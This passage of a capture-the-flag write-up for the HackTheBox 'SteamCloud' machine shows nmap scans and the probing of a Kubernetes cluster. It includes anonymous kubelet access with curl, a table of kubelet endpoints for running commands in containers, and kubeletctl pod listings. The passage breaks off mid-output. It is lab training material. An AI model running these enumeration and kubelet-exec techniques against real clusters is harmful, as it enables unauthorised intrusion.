                    <a href="#nmap---detailed" aria-label="Nmap - detailed">Nmap - detailed</a></li></ul>
                </li>
                <li>
                    <a href="#enumeration" aria-label="Enumeration">Enumeration</a><ul>
                        
                <li>
                    <a href="#ssh-22" aria-label="SSH 22">SSH 22</a></li>
                <li>
                    <a href="#port-8443" aria-label="Port 8443">Port 8443</a></li>
                <li>
                    <a href="#kubernetes-ports" aria-label="Kubernetes Ports">Kubernetes Ports</a></li>
                <li>
                    <a href="#port-10250" aria-label="Port 10250">Port 10250</a></li>
                <li>
                    <a href="#kubeletctl" aria-label="Kubeletctl">Kubeletctl</a></li></ul>
                </li>
                <li>
                    <a href="#getting-user-shell" aria-label="Getting User shell">Getting User shell</a><ul>
                        
                <li>
                    <a href="#user-flag-" aria-label="User Flag 🚩">User Flag 🚩</a></li></ul>
                </li>
                <li>
                    <a href="#what-is-a-kubernetes-serviceaccount" aria-label="What is a Kubernetes Serviceaccount?">What is a Kubernetes Serviceaccount?</a><ul>
                        
                <li>
                    <a href="#what-lives-at-runsecretskubernetesioserviceaccount-directory" aria-label="What lives at /run/secrets/kubernetes.io/serviceaccount directory?">What lives at /run/secrets/kubernetes.io/serviceaccount directory?</a></li>
                <li>
                    <a href="#why-this-matters-for-privilege-escalation" aria-label="Why this matters for privilege escalation">Why this matters for privilege escalation</a></li></ul>
                </li>
                <li>
                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a></li>
                <li>
                    <a href="#root-flag-" aria-label="Root Flag 🚩">Root Flag 🚩</a></li>
                <li>
                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a></li>
                <li>
                    <a href="#key-takeaways" aria-label="Key Takeaways">Key Takeaways</a></li>
                <li>
                    <a href="#references" aria-label="References">References</a></li>
                <li>
                    <a href="#connect-with-me" aria-label="Connect with me">Connect with me</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="box-info">Box Info<a hidden class="anchor" aria-hidden="true" href="#box-info">#</a></h2>
<p><img alt="Box Information" loading="lazy" src="/images/HTB/SteamCloud/1.png"></p>
<table>
  <thead>
      <tr>
          <th><strong>Attribute</strong></th>
          <th><strong>Details</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>Level</strong></td>
          <td>Easy</td>
      </tr>
      <tr>
          <td><strong>OS</strong></td>
          <td>Linux</td>
      </tr>
      <tr>
          <td><strong>Box URL</strong></td>
          <td><a href="https://app.hackthebox.com/machines/443">https://app.hackthebox.com/machines/443</a></td>
      </tr>
      <tr>
          <td><strong>Box Status</strong></td>
          <td>Retired</td>
      </tr>
      <tr>
          <td><strong>About Box</strong></td>
          <td>SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes-specific ports open. We can not enumerate the Kubernetes API because it requires authentication. Now, as Kubelet allows anonymous access, we can extract a list of all the pods from the K8S cluster by enumerating the Kubelet service. Furthermore, we can get into one of the pods and obtain the keys necessary to authenticate to the Kubernetes API. We can now create and spawn a malicious pod and then use Kubectl to run commands within the pod to read the root flag.</td>
      </tr>
  </tbody>
</table>
<h2 id="footprinting">Footprinting<a hidden class="anchor" aria-hidden="true" href="#footprinting">#</a></h2>
<h3 id="nmap---basic">Nmap - basic<a hidden class="anchor" aria-hidden="true" href="#nmap---basic">#</a></h3>
<p>Let&rsquo;s start with scanning the machine IP with nmap to check what are the services are running on different ports!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p 22,2379,2380,8443,10249,10250,10256 --min-rate <span class="m">10000</span> <span class="nv">$ip</span> -oN 1.basic.nmap.txt
</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-10-02 21:45 +0530
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.133
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp    open  ssh
</span></span><span class="line"><span class="cl">2379/tcp  open  etcd-client
</span></span><span class="line"><span class="cl">2380/tcp  open  etcd-server
</span></span><span class="line"><span class="cl">8443/tcp  open  https-alt
</span></span><span class="line"><span class="cl">10249/tcp open  unknown
</span></span><span class="line"><span class="cl">10250/tcp open  unknown
</span></span><span class="line"><span class="cl">10256/tcp open  unknown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 1.26 seconds
</span></span></code></pre></div><h3 id="nmap---detailed">Nmap - detailed<a hidden class="anchor" aria-hidden="true" href="#nmap---detailed">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sCV -p 22,2379,2380,8443,10249,10250,10256 <span class="nv">$ip</span> -oN 3.detailed.nmap.txt
</span></span><span class="line"><span class="cl">Starting Nmap 7.97 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-10-02 21:55 +0530
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.133
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.31s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE          VERSION
</span></span><span class="line"><span class="cl">22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">2379/tcp  open  ssl/etcd-client?
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>steamcloud
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-10-02T16:08:35
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-10-02T16:08:35
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  h2
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">2380/tcp  open  ssl/etcd-server?
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  h2
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>steamcloud
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-10-02T16:08:35
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-10-02T16:08:36
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">8443/tcp  open  ssl/http         Golang net/http server
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Audit-Id: 13ad7bea-1258-4ffc-acfb-b23dc09805f8
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: no-cache, private
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: application/json
</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Content-Type-Options: nosniff
</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Kubernetes-Pf-Flowschema-Uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd
</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Kubernetes-Pf-Prioritylevel-Uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Thu, <span class="m">02</span> Oct <span class="m">2025</span> 16:25:32 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">212</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="o">{</span><span class="s2">&#34;kind&#34;</span>:<span class="s2">&#34;Status&#34;</span>,<span class="s2">&#34;apiVersion&#34;</span>:<span class="s2">&#34;v1&#34;</span>,<span class="s2">&#34;metadata&#34;</span>:<span class="o">{}</span>,<span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;Failure&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;forbidden: User &#34;</span>system:anonymous<span class="s2">&#34; cannot get path &#34;</span>/nice ports,/Trinity.txt.bak<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;reason&#34;</span>:<span class="s2">&#34;Forbidden&#34;</span>,<span class="s2">&#34;details&#34;</span>:<span class="o">{}</span>,<span class="s2">&#34;code&#34;</span>:403<span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines, Help, RTSPRequest, SSLSessionReq:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest:
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Audit-Id: 6a334c86-3068-4f26-8887-5adf56610e19
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: no-cache, private
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: application/json
</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Content-Type-Options: nosniff
</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Kubernetes-Pf-Flowschema-Uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd
</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Kubernetes-Pf-Prioritylevel-Uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Thu, <span class="m">02</span> Oct <span class="m">2025</span> 16:25:29 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">185</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    <span class="o">{</span><span class="s2">&#34;kind&#34;</span>:<span class="s2">&#34;Status&#34;</span>,<span class="s2">&#34;apiVersion&#34;</span>:<span class="s2">&#34;v1&#34;</span>,<span class="s2">&#34;metadata&#34;</span>:<span class="o">{}</span>,<span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;Failure&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;forbidden: User &#34;</span>system:anonymous<span class="s2">&#34; cannot get path &#34;</span>/<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;reason&#34;</span>:<span class="s2">&#34;Forbidden&#34;</span>,<span class="s2">&#34;details&#34;</span>:<span class="o">{}</span>,<span class="s2">&#34;code&#34;</span>:403<span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>minikube/organizationName<span class="o">=</span>system:masters
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-10-01T16:08:33
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2028-10-01T16:08:33
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title (application/json).
</span></span></span><span class="line"><span class="cl"><span class="s1">| tls-alpn:
</span></span></span><span class="line"><span class="cl"><span class="s1">|   h2
</span></span></span><span class="line"><span class="cl"><span class="s1">|_  http/1.1
</span></span></span><span class="line"><span class="cl"><span class="s1">|_ssl-date: TLS randomness does not represent time
</span></span></span><span class="line"><span class="cl"><span class="s1">10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: Site doesn&#39;</span>t have a title <span class="o">(</span>text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span>.
</span></span><span class="line"><span class="cl">10250/tcp open  ssl/http         Golang net/http server <span class="o">(</span>Go-IPFS json-rpc or InfluxDB API<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title (text/plain; charset=utf-8).
</span></span></span><span class="line"><span class="cl"><span class="s1">| ssl-cert: Subject: commonName=steamcloud@1759421317
</span></span></span><span class="line"><span class="cl"><span class="s1">| Subject Alternative Name: DNS:steamcloud
</span></span></span><span class="line"><span class="cl"><span class="s1">| Not valid before: 2025-10-02T15:08:37
</span></span></span><span class="line"><span class="cl"><span class="s1">|_Not valid after:  2026-10-02T15:08:37
</span></span></span><span class="line"><span class="cl"><span class="s1">| tls-alpn:
</span></span></span><span class="line"><span class="cl"><span class="s1">|   h2
</span></span></span><span class="line"><span class="cl"><span class="s1">|_  http/1.1
</span></span></span><span class="line"><span class="cl"><span class="s1">|_ssl-date: TLS randomness does not represent time
</span></span></span><span class="line"><span class="cl"><span class="s1">10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: Site doesn&#39;</span>t have a title <span class="o">(</span>text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span>.
</span></span></code></pre></div><ul>
<li>Found open ports: 22 (SSH), 2379 (etcd), 2380 (etcd), 8443 (http), 10249 (kubelet), 10250 (kubelet), 10256 (http)</li>
<li>The web application running on port 8443 is showing 403 Forbidden with the message &ldquo;User &lsquo;system: anonymous&rsquo; cannot get path &lsquo;/&rsquo;&rdquo;</li>
<li>Identified multiple subject alternative names related to Kubernetes.</li>
</ul>
<p><strong>Subject Alternative Name:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">DNS:minikubeCA, 
</span></span><span class="line"><span class="cl">DNS:control-plane.minikube.internal, 
</span></span><span class="line"><span class="cl">DNS:kubernetes.default.svc.cluster.local, 
</span></span><span class="line"><span class="cl">DNS:kubernetes.default.svc, 
</span></span><span class="line"><span class="cl">DNS:kubernetes.default, 
</span></span><span class="line"><span class="cl">DNS:kubernetes, 
</span></span><span class="line"><span class="cl">DNS:localhost, 
</span></span><span class="line"><span class="cl">IP Address:10.10.11.133, 
</span></span><span class="line"><span class="cl">IP Address:10.96.0.1, 
</span></span><span class="line"><span class="cl">IP Address:127.0.0.1, 
</span></span><span class="line"><span class="cl">IP Address:10.0.0.1
</span></span></code></pre></div><p><strong>Let’s add steamcloud host to our /etc/hosts file:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.11.133 	steamcloud.htb&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
<h3 id="ssh-22">SSH 22<a hidden class="anchor" aria-hidden="true" href="#ssh-22">#</a></h3>
<p>We tried the same for SSH by attempting an anonymous login, but it was unsuccessful.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh anonymous@steamcloud.htb
</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;steamcloud.htb (10.10.11.133)&#39;</span> can<span class="s1">&#39;t be established.
</span></span></span><span class="line"><span class="cl"><span class="s1">ED25519 key fingerprint is SHA256:/BfbWBuZ6K3xx1f7py/c7eMZ1Wedb7sKF5yhMHNXHZ4.
</span></span></span><span class="line"><span class="cl"><span class="s1">This key is not known by any other names.
</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>steamcloud.htb<span class="s1">&#39; (ED25519) to the list of known hosts.
</span></span></span><span class="line"><span class="cl"><span class="s1">anonymous@steamcloud.htb&#39;</span>s password:
</span></span><span class="line"><span class="cl">Permission denied, please try again.
</span></span></code></pre></div><h3 id="port-8443">Port 8443<a hidden class="anchor" aria-hidden="true" href="#port-8443">#</a></h3>
<p><img loading="lazy" src="/images/HTB/SteamCloud/2.png"></p>
<p><strong>Response Headers</strong>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -ik https://steamcloud.htb:8443/
</span></span><span class="line"><span class="cl">HTTP/2 <span class="m">403</span>
</span></span><span class="line"><span class="cl">audit-id: 852abb91-1bd8-400d-8616-1c7511c78885
</span></span><span class="line"><span class="cl">cache-control: no-cache, private
</span></span><span class="line"><span class="cl">content-type: application/json
</span></span><span class="line"><span class="cl">x-content-type-options: nosniff
</span></span><span class="line"><span class="cl">x-kubernetes-pf-flowschema-uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd
</span></span><span class="line"><span class="cl">x-kubernetes-pf-prioritylevel-uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2
</span></span><span class="line"><span class="cl">content-length: <span class="m">233</span>
</span></span><span class="line"><span class="cl">date: Thu, <span class="m">02</span> Oct <span class="m">2025</span> 16:34:49 GMT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;kind&#34;</span>: <span class="s2">&#34;Status&#34;</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;apiVersion&#34;</span>: <span class="s2">&#34;v1&#34;</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;metadata&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;Failure&#34;</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;forbidden: User \&#34;system:anonymous\&#34; cannot get path \&#34;/\&#34;&#34;</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;reason&#34;</span>: <span class="s2">&#34;Forbidden&#34;</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;details&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;code&#34;</span>: <span class="m">403</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Based on the response headers, it was observed that the application is running on Kubernetes. It was giving a 403 Forbidden, which indicates the Kubernetes API server is rejecting the request because <code>system:anonymous</code> does not have permission to access that path.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; kubectl --server https://10.10.11.133:8443 get pods
</span></span><span class="line"><span class="cl">Unable to connect to the server: tls: failed to verify certificate: x509: certificate signed by unknown authority
</span></span></code></pre></div><p>I tried to access port 8443 using kubectl, but it was asking for a valid username and password, which I couldn&rsquo;t brute-force.</p>
<h3 id="kubernetes-ports">Kubernetes Ports<a hidden class="anchor" aria-hidden="true" href="#kubernetes-ports">#</a></h3>
<table>
  <thead>
      <tr>
          <th>Protocol</th>
          <th>Direction</th>
          <th>Port Range</th>
          <th>Purpose</th>
          <th>Used By</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>TCP</td>
          <td>Inbound</td>
          <td>6443</td>
          <td>Kubernetes API server</td>
          <td>All</td>
      </tr>
      <tr>
          <td>TCP</td>
          <td>Inbound</td>
          <td>2379-2380</td>
          <td>etcd server client API</td>
          <td>kube-apiserver, etcd</td>
      </tr>
      <tr>
          <td>TCP</td>
          <td>Inbound</td>
          <td>10250</td>
          <td>Kubelet API</td>
          <td>Self, Control plane</td>
      </tr>
      <tr>
          <td>TCP</td>
          <td>Inbound</td>
          <td>10259</td>
          <td>kube-scheduler</td>
          <td>Self</td>
      </tr>
      <tr>
          <td>TCP</td>
          <td>Inbound</td>
          <td>10257</td>
          <td>kube-controller-manager</td>
          <td>Self</td>
      </tr>
  </tbody>
</table>
<blockquote>
<p>Reference: <a href="https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane">https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane</a></p></blockquote>
<h3 id="port-10250">Port 10250<a hidden class="anchor" aria-hidden="true" href="#port-10250">#</a></h3>
<p>Port 10250 on the kubelet is used by the kube-apiserver for exec and logs.</p>
<p>I came across this gist repo about &ldquo;Accessing the kubelet-api&rdquo; by <a href="https://gist.github.com/lizrice/c32740fac51db2a5518f06c3dae4944f">lizrice</a>. First, I tried to list pods using a simple GET request to check whether listing pods as <code>anonymous-auth</code> was possible.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -sk https://10.10.11.133:10250/pods/
</span></span></code></pre></div><ul>
<li>If <code>--anonymous-auth</code> is turned off, you will see a <code>401 Unauthorized</code> response.</li>
<li>If <code>--anonymous-auth</code> is <code>true</code> and <code>--authorization-mode</code> is <code>Webhook</code> you&rsquo;ll see <code>403 Forbidden</code> response with message <code>Forbidden (user=system:anonymous, verb=get, resource=nodes, subresource=proxy)</code></li>
<li>If <code>--anonymous-auth</code> is <code>true</code> and <code>--authorization-mode</code> is <code>AlwaysAllow</code> you&rsquo;ll see a list of pods.</li>
</ul>
<p>We got the proper 200 OK response which means that <code>--anonymous-auth</code> is true and <code>--authorization-mode</code> is AlwaysAllow.</p>
<p><strong>Response:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;kind&#34;</span>:<span class="s2">&#34;PodList&#34;</span>,<span class="s2">&#34;apiVersion&#34;</span>:<span class="s2">&#34;v1&#34;</span>,<span class="s2">&#34;metadata&#34;</span>:<span class="o">{}</span>,<span class="s2">&#34;items&#34;</span>:<span class="o">[{</span><span class="s2">&#34;metadata&#34;</span>:<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;etcd-steamcloud&#34;</span>,<span class="s2">&#34;namespace&#34;</span>:<span class="s2">&#34;kube-system&#34;</span>,<span class="s2">&#34;selfLink&#34;</span>:<span class="s2">&#34;/api/v1/namespaces/kube-system/pods/etcd-steamcloud&#34;</span>,<span class="s2">&#34;uid&#34;</span>:<span class="s2">&#34;967b9bee71f2e3cec06ff1dbde2a2a19&#34;</span>,<span class="s2">&#34;creationTimestamp&#34;</span>:null,<span class="s2">&#34;labels&#34;</span>:<span class="o">{</span><span class="s2">&#34;component&#34;</span>:<span class="s2">&#34;etcd&#34;</span>,<span class="s2">&#34;tier&#34;</span>:<span class="s2">&#34;control-plane&#34;</span><span class="o">}</span>,<span class="s2">&#34;annotations&#34;</span>:<span class="o">{</span><span class="s2">&#34;kubeadm.kubernetes.io/etcd.advertise-client-urls&#34;</span>:<span class="s2">&#34;https://10.10.11.133:2379&#34;</span>,<span class="s2">&#34;kubernetes.io/config.hash&#34;</span>:<span class="s2">&#34;967b9bee71f2e3cec06ff1dbde2a2a19&#34;</span>,<span class="s2">&#34;kubernetes.io/config.seen&#34;</span>:<span class="s2">&#34;2025-10-02T12:08:51.371667834-04:00&#34;</span>,<span class="s2">&#34;kubernetes.io/config.source&#34;</span>:<span class="s2">&#34;file&#34;</span><span class="o">}}</span>
</span></span></code></pre></div><p>We found the article by cyberark about kubelet client attack which shows how to use the different api endpoints manually to list pods or run the commands insides the container. While using this command one by one to find the token and go though the multiple directories it will be complicated and time consuming at the same time.</p>
<p><strong>Kubelet API endpoints to perform the multiple task:</strong></p>
<table>
  <thead>
      <tr>
          <th>Kubelet API</th>
          <th>Examples for use</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>/pods</td>
          <td>GET <code>/pods</code></td>
          <td>List the pods in the kubelet’s worker</td>
      </tr>
      <tr>
          <td>/run</td>
          <td>POST <code>/run/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;containerName&gt;</code>  <br>POST <code>/run/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;uid&gt;/&lt;containerName&gt;</code>  <br>Body: <code>&lt;command&gt;</code></td>
          <td>Run command in a container</td>
      </tr>
      <tr>
          <td>/exec</td>
          <td>GET  <code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;containerName&gt;?command=&lt;command&gt;</code>  <br>POST <code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;containerName&gt;?command=&lt;command&gt;  </code><br>GET  <code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;uid&gt;/&lt;containerName&gt;?command=&lt;command&gt;</code>  <br>POST <code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;uid&gt;/&lt;containerName&gt;?command=&lt;command&gt;</code></td>
          <td>Run command using a stream in a container</td>
      </tr>
      <tr>
          <td>/configz</td>
          <td>GET <code>/configz</code></td>
          <td>Kubelet’s configuration file settings</td>
      </tr>
      <tr>
          <td>/debug</td>
          <td>GET <code>/debug/flags/v</code><br>PUT <code>/debug/flags/v (body: &lt;integer&gt;)  </code><br>GET <code>/debug/pprof/&lt;profile&gt;</code></td>
          <td>Debug information</td>
      </tr>
  </tbody>
</table>
<h3 id="kubeletctl">Kubeletctl<a hidden class="anchor" aria-hidden="true" href="#kubeletctl">#</a></h3>
<p>The above mentioned blog also mentions about the tool called kubeletctl which can be used to make command execution and pods listing process easy. If you are using mac to solve this problem you might face issue while installing and using the tool. It&rsquo;s recommended to use the docker image which can be easiest way to install and run the tool without facing any architecture or dependency related issue.</p>
<p>List the running pods using below mentioned command and it will give the proper table format output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/ $ kubeletctl pods --server 10.10.11.133
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌────────────────────────────────────────────────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│                                Pods from Kubelet                               │
</span></span><span class="line"><span class="cl">├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
</span></span><span class="line"><span class="cl">│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
</span></span><span class="line"><span class="cl">├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</span></span><span class="line"><span class="cl">│ <span class="m">1</span> │ coredns-78fcd69978-l4jd5           │ kube-system │ coredns                 │
</span></span><span class="line"><span class="cl">│   │                                    │             │                         │
</span></span><span class="line"><span class="cl">├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</span></span><span class="line"><span class="cl">│ <span class="m">2</span> │ nginx                              │ default     │ nginx                   │
</span></span><span class="line"><span class="cl">│   │                                    │             │                         │
</span></span><span class="line"><span class="cl">├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</span></span><span class="line"><span class="cl">│ <span class="m">3</span> │ etcd-steamcloud                    │ kube-system │ etcd                    │
</span></span><span class="line"><span class="cl">│   │                                    │             │                         │
</span></span><span class="line"><span class="cl">├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</span></span><span class="line"><span class="cl">│ <span class="m">4</span> │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
</span></span><span class="line"><span class="cl">│   │                                    │             │                         │
</span></span><span class="line"><span class="cl">├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</span></span><span class="line"><span class="cl">│ <span class="m">5</span> │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
</span></span><span class="line"><span class="cl">│   │                                    │             │                         │
